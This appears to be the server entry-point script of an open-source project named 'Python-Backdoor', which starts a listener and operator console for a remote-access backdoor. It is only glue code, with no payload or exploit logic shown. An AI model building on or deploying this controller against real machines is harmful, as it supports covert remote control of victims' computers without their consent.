"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import sys
import os

# append path, needed for all 'main' files
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))

from src.args import Args
from src import logger
from src.server.control import Control
from src.server.server import Server
from src.server.view import View


class MainServer:
    def __init__(self):
        self._args = Args(self)
        logger.init(self._args.get_args())

        self.server = Server(self._args.get_args().port)
        self.control = Control(self.server)

    def start(self):
        self.server.listen_asych()

        View(self.control)


if __name__ == "__main__":
    MainServer().start()
